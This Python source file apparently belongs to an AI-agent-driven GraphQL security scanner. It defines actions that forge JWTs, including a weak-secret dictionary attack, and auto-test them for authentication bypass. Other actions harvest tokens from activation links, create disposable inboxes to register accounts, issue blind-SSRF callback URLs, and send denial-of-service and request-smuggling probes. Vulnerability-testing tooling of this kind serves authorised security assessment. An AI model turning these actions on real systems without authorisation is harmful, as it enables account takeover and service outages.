"""Arsenal action handlers: visit, forge_jwt, oob_url, temp_mail, dos, smuggle, csrf."""

from __future__ import annotations

import json
import re
from datetime import datetime, timezone

from . import action
from .context import ActionContext, Result
from ..arsenal_tools import tool_csrf, tool_dos, tool_forge_jwt, tool_smuggle
from ..senses import is_dead

_ACTIVATED_MARKERS = ("activated", "confirmed", "verified", "successfully", "your account is now",
                      "email confirmed", "account is active", "thank you for", "welcome")
_LINK_TOKEN_RE = re.compile(r"(?:access_token|token|jwt|auth|key|confirmation)=([A-Za-z0-9._\-]{12,})", re.I)


@action("visit")
def handle_visit(ctx: ActionContext, args: dict) -> Result:
    """GET an activation/magic-login link in the client session and report the result.

    Follows redirects, harvests any token found in the final URL or body, and flags the
    account as activated when the response text carries a confirmation marker.
    """
    url = str(args.get("url", "")).strip()
    if not url.lower().startswith(("http://", "https://")):
        return Result(observation="visit needs {url} (http/https) - open an account-activation / magic-login / "
                      "password-reset LINK (e.g. from temp_mail's LINKS=). It GETs the link in your session, "
                      "follows redirects, harvests any token, and tells you if the account looks activated.")
    import requests
    sess = getattr(ctx.client, "session", None) or requests
    try:
        r = sess.get(url, timeout=15, allow_redirects=True)
    except Exception as e:  # noqa: BLE001
        ctx.log(f"[{ctx.step}] visit ERROR: {str(e)[:120]}")
        return Result(observation=f"visit failed: {str(e)[:120]}")
    status = getattr(r, "status_code", 0)
    final = str(getattr(r, "url", url))
    body = (getattr(r, "text", "") or "")[:1500]
    activated = status < 400 and any(m in (body + " " + final).lower() for m in _ACTIVATED_MARKERS)
    bits = [f"HTTP {status}", f"final={final[:120]}"]
    if activated:
        bits.append("⚠ looks ACTIVATED/confirmed - try logging in or re-running the authed queries now")
    m = _LINK_TOKEN_RE.search(final + " " + body)
    if m:
        ctx.harvested.setdefault("token", []).append(m.group(1))
        bits.append(f"HARVESTED token from link ({m.group(1)[:14]}…) - adopt via set_identity if it's a session token")
    cookies = list(getattr(getattr(sess, "cookies", None), "keys", lambda: [])())
    if cookies:
        bits.append("session cookies now: " + ", ".join(cookies[:6]))
    ctx.trace_io(f"GET {url}", {}, {"data": body, "_status_code": status}, label="visit")
    ctx.interactions.append({"target_node": f"visit:{final[:80]}", "reason": "agent_visit",
                             "response_status": status, "score": 0.0,
                             "timestamp": datetime.now(timezone.utc).isoformat()})
    obs = "visit -> " + " | ".join(bits)
    ctx.log(f"[{ctx.step}] {obs}")
    return Result(observation=obs, touched_target=True, is_dead=is_dead(status))


def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str,
                          sink_cap: int = 6) -> list[str]:
    """Submit the forged `token` into every schema field that takes a token/jwt/auth arg, filling
    the field's other args with scalar defaults, and record an auth-bypass finding when the field
    returns data. Doing it here removes the fragile step of the model hand-copying a 3-segment JWT
    (which repeatedly dropped the empty-signature segment -> 'Not enough segments').
    """
    from ..coverage import token_arg_fields
    from ..schema import _minimal_selection

    sm = ctx.schema_map
    mroot = sm.get("_mutation_type", "Mutation")
    lines: list[str] = []
    for sink in token_arg_fields(sm, cap=sink_cap):
        m = re.match(r"(\w+)\((\w+)\)", sink)
        if not m:
            continue
        field, targ = m.group(1), m.group(2)
        root = next((r for r in (sm.get("_query_type", "Query"), mroot)
                     if isinstance(sm.get(r), dict) and field in sm[r]), None)
        if root is None:
            continue
        info = sm[root].get(field) or {}
        parts: list[str] = []
        skip = False
        for a in info.get("args") or []:
            nm = str(a.get("name", ""))
            typ = str(a.get("type") or "")
            base = re.sub(r"[\[\]!]", "", typ).strip()
            if nm == targ:
                parts.append(f"{nm}: {json.dumps(token)}")
            elif base in ("Int", "Float", "Boolean", "String", "ID") and "[" not in typ:
                parts.append(f"{nm}: " + {"Int": "1", "Float": "1.0", "Boolean": "true"}.get(base, '"1"'))
            elif typ.endswith("!"):
                skip = True
                break
        if skip:
            lines.append(f"{field}({targ}) -> skipped (needs a complex arg)")
            continue
        sel = _minimal_selection(sm, info.get("return_type", ""))
        op = "mutation" if root == mroot else "query"
        query = f"{op} {{ {field}({', '.join(parts)}) {sel} }}".strip()
        try:
            resp = ctx.client.execute(query, None, extra_headers=ctx.identity or None)
        except Exception as e:  # noqa: BLE001
            lines.append(f"{field}({targ}) -> request error: {str(e)[:50]}")
            continue
        ctx.trace_io(query, {}, resp, label=f"forge_jwt:autotest:{field}")
        data = resp.get("data") if isinstance(resp.get("data"), dict) else {}
        val = data.get(field) if isinstance(data, dict) else None
        errtext = json.dumps(resp.get("errors") or [], default=str)[:200].lower()
        if val not in (None, [], {}, ""):
            ctx.record(f"JWT Forgery Auth Bypass ({approach}) - forged token accepted by {field}({targ})",
                       f"{field}({targ})",
                       f"forged {approach} token accepted; {field} returned data: "
                       f"{json.dumps(val, default=str)[:150]}", 4.0)
            lines.append(f"{field}({targ}) -> ACCEPTED, returned data - AUTH BYPASS (recorded)")
        elif any(k in errtext for k in ("segment", "signature", "invalid token", "decode", "expired", "malformed")):
            lines.append(f"{field}({targ}) -> rejected ({errtext[:60].strip() or 'error'})")
        else:
            lines.append(f"{field}({targ}) -> not rejected but returned no data - forge with a VALID identity "
                         f"claim (seed a real token via login/createUser, then re-forge)")
    return lines


@action("forge_jwt")
def handle_forge_jwt(ctx: ActionContext, args: dict) -> Result:
    try:
        approach = str(args.get("approach", "none"))
        secret = args.get("secret")
        claims = args.get("claims") if isinstance(args.get("claims"), dict) else None
        a = (approach or "none").lower()
        if ("weak" in a or "secret" in a) and not secret:
            obs = _forge_weak_secret_dictionary(ctx, claims)
        else:
            token = tool_forge_jwt(approach, secret, claims, ctx.harvested)
            ctx.harvested.setdefault("forged_jwt", []).append(token)
            tested = _autotest_token_sinks(ctx, token, approach)
            obs = f"forged token: {token}"
            if tested:
                obs += ("\n  auto-tested against the field's token arg (no need to re-send by hand):\n    "
                        + "\n    ".join(tested)
                        + "\n  Also adopt via set_identity {\"Authorization\": \"Bearer <token>\"} to test the header path.")
            else:
                obs += ("\n  no schema field takes a token/jwt/auth arg - adopt via set_identity "
                        "{\"Authorization\": \"Bearer <token>\"} to test header-based acceptance.")
    except Exception as e:  # noqa: BLE001
        obs = f"forge_jwt failed: {str(e)[:120]}"
    ctx.log(f"[{ctx.step}] forge_jwt -> {obs[:200]}")
    return Result(observation=obs, touched_target=True)


def _forge_weak_secret_dictionary(ctx: ActionContext, claims: dict | None) -> str:
    """Try the built-in common-secret list against the schema's token sinks in one action.

    Mints one HS256 candidate per known weak secret (seeded with any harvested claims),
    auto-tests each against up to 2 token-arg fields, and stops at the first acceptance
    (recorded as a finding by _autotest_token_sinks).
    """
    from ...utils import jwt_attacks

    base: dict = {}
    for tok in ctx.harvested.get("jwt", []):
        base = jwt_attacks.decode_payload(tok) or base
        if base:
            break
    if isinstance(claims, dict):
        base = {**base, **claims}

    candidates = jwt_attacks.forged_tokens("jwt_weak_secret", base)
    if not candidates:
        return "weak_secret: no candidates minted (internal error)"
    rejected: list[str] = []
    tested_any = False
    for label, token in candidates:
        ctx.harvested.setdefault("forged_jwt", []).append(token)
        tested = _autotest_token_sinks(ctx, token, label, sink_cap=2)
        tested_any = tested_any or bool(tested)
        if any("ACCEPTED" in t for t in tested):
            return (f"⚠ weak-secret WIN: {label} - the server signed with a COMMON secret "
                    f"({len(rejected) + 1} tried). Forged admin token: {token}\n    "
                    + "\n    ".join(t for t in tested if t))
        rejected.append(label)
    head = f"weak_secret: none of the {len(candidates)} common secrets verified"
    if tested_any:
        return (head + " against the schema's token-arg fields (the signing secret is not a "
                "common one, or tokens aren't read from field args). Secrets tried: "
                + ", ".join(rejected))
    return (head + " - no schema field takes a token/jwt/auth arg, so nothing was server-tested. "
            f"{len(candidates)} candidate tokens minted (last one kept for auth_test); adopt one "
            "via set_identity {\"Authorization\": \"Bearer <token>\"} to test the header path. "
            "Secrets tried: " + ", ".join(rejected))


@action("oob_url")
def handle_oob_url(ctx: ActionContext, args: dict) -> Result:
    """Issue an OOB callback URL, or (op:check) reconcile received callbacks into findings."""
    if ctx.oob_sess is None:
        obs = "OOB not configured (set scanner.oob.enabled + collaborator_domain)"
    elif str(args.get("op", "")).lower() == "check":
        try:
            hits = ctx.oob_sess.reconcile()
        except Exception as e:  # noqa: BLE001
            ctx.log(f"[{ctx.step}] oob_url -> oob check failed: {str(e)[:80]}")
            return Result(observation=f"oob check failed: {str(e)[:80]}")
        if hits:
            for h in hits:
                ix = h.get("interaction", {})
                proto = ix.get("protocol", "?")
                ctx.record(f"Blind SSRF / OOB interaction ({proto}) confirmed", "endpoint",
                           f"OOB {proto} callback from {ix.get('remote-address', '?')}", 3.0)
            protos = ", ".join(sorted({h.get("interaction", {}).get("protocol", "?") for h in hits}))
            obs = f"⚠ {len(hits)} OOB CALLBACK(S) RECEIVED - blind SSRF/XXE CONFIRMED (protocols: {protos})"
        else:
            obs = ("no OOB callbacks yet - inject the URL into a url/webhook/fetch field, then "
                   "'oob_url op:check' again a few steps later (callbacks can lag)")
    else:
        url, _label = ctx.oob_sess.issue({"approach": "agent", "node": str(args.get("note", "agent"))})
        obs = (f"OOB callback URL - inject into a url/webhook/redirect/fetch arg, THEN run oob_url "
               f"with op:\"check\" later to confirm a blind SSRF/XXE hit: {url}")
    ctx.log(f"[{ctx.step}] oob_url -> {obs}")
    return Result(observation=obs)


@action("temp_mail")
def handle_temp_mail(ctx: ActionContext, args: dict) -> Result:
    op = str(args.get("op", "")).lower()
    if ctx.tempmail is None or op in ("new", "create"):
        from ...utils.tempmail import TempMailClient
        ctx.tempmail = TempMailClient()
        addr = ctx.tempmail.create()
        obs = (f"inbox ready: {addr} - REGISTER with this EXACT email, then call temp_mail "
               f"again to read the confirmation key" if addr
               else "temp_mail unavailable (mail.tm unreachable) - confirmation flow not possible")
    else:
        msgs = ctx.tempmail.poll()
        if not msgs:
            obs = (f"inbox {ctx.tempmail.address}: no new mail yet - register with this address "
                   f"first, or wait a few seconds and call temp_mail again")
        else:
            lines = []
            for m in msgs:
                bits = [f"from={m['from']} subj=\"{m['subject'][:60]}\""]
                if m["keys"]:
                    bits.append("KEYS=" + ", ".join(m["keys"][:4]))
                if m["links"]:
                    bits.append("LINKS=" + " ".join(m["links"][:2]))
                lines.append(" | ".join(bits))
            obs = (f"inbox {ctx.tempmail.address} ({len(msgs)} new) - confirm with a KEY via "
                   f"confirmEmail(input:{{confirmation_key, email}}), OR `visit` an activation LINK:\n   "
                   + "\n   ".join(lines))
    ctx.log(f"[{ctx.step}] temp_mail -> {obs}")
    return Result(observation=obs)


def _no_required_args(schema_map: dict, field: str) -> bool:
    qroot = schema_map.get("_query_type", "Query")
    info = (schema_map.get(qroot) or {}).get(field)
    if not isinstance(info, dict):
        return False
    return not any(str(a.get("type", "")).rstrip().endswith("!") for a in (info.get("args") or []))


@action("dos")
def handle_dos(ctx: ActionContext, args: dict) -> Result:
    data_field = next((f for f, e in ctx.ledger.items()
                       if e.get("auto") == "DATA" and _no_required_args(ctx.schema_map, f)), None)
    try:
        q, resp, vt, reason = tool_dos(ctx.client, ctx.schema_map, str(args.get("type", "aliases")),
                                       data_field=data_field, extra_headers=ctx.identity or None)
    except Exception as e:  # noqa: BLE001
        obs = f"dos failed: {str(e)[:120]}"
        ctx.log(f"[{ctx.step}] dos -> {obs}")
        return Result(observation=obs)
    ctx.trace_io(q, {}, resp, label=f"dos:{args.get('type', 'aliases')}")
    dead = is_dead(resp.get("_status_code", 0))
    ctx.interactions.append({"target_node": "dos", "reason": "agent_dos",
                             "response_status": resp.get("_status_code", 0), "score": 0.0,
                             "timestamp": datetime.now(timezone.utc).isoformat()})
    if vt:
        if ctx.record(vt, q[:60], reason, 2.5):
            obs = f"⚠ {vt}: {reason[:120]}"
        else:
            obs = f"{vt} already recorded (same DoS class, no new finding): {reason[:120]}"
    else:
        obs = f"overload rejected/limited (HTTP {resp.get('_status_code', 0)}) - DoS protection present"
    ctx.log(f"[{ctx.step}] dos {args.get('type', 'aliases')} -> {obs}")
    return Result(observation=obs, touched_target=True, is_dead=dead)


@action("smuggle")
def handle_smuggle(ctx: ActionContext, args: dict) -> Result:
    try:
        vuln, detail = tool_smuggle(ctx.target_url)
    except Exception as e:  # noqa: BLE001
        obs = f"smuggle failed: {str(e)[:120]}"
        ctx.log(f"[{ctx.step}] smuggle -> {obs}")
        return Result(observation=obs)
    ctx.interactions.append({"target_node": "smuggle", "reason": "agent_smuggle",
                             "response_status": 0, "score": 0.0,
                             "timestamp": datetime.now(timezone.utc).isoformat()})
    if vuln:
        ctx.record("HTTP Request Smuggling", "endpoint", detail, 3.0)
    obs = ("⚠ " if vuln else "") + detail
    ctx.log(f"[{ctx.step}] smuggle -> {obs}")
    return Result(observation=obs)


@action("csrf")
def handle_csrf(ctx: ActionContext, args: dict) -> Result:
    try:
        cookies = ctx.settings.get("target", {}).get("cookies") or {}
        mfields = ctx.schema_map.get(ctx.schema_map.get("_mutation_type", "Mutation"))
        n_mut = len([f for f in mfields if not str(f).startswith("_")]) if isinstance(mfields, dict) else 0
        lines = tool_csrf(ctx.target_url, cookies, n_mutations=n_mut,
                          session=getattr(ctx.client, "session", None))
    except Exception as e:  # noqa: BLE001
        obs = f"csrf failed: {str(e)[:120]}"
        ctx.log(f"[{ctx.step}] csrf -> {obs}")
        return Result(observation=obs)
    for ln in lines:
        if "GET-MUTATION CONFIRMED" in ln:
            ctx.record("Cross-Site Request Forgery (mutation executable via GET)", "endpoint", ln, 3.0)
        elif "CORS: reflects arbitrary Origin WITH credentials" in ln:
            ctx.record("CORS Misconfiguration (arbitrary origin reflected with credentials)", "endpoint", ln, 3.0)
    obs = " | ".join(lines)
    ctx.log(f"[{ctx.step}] csrf -> {obs[:700]}")
    return Result(observation=obs[:700])
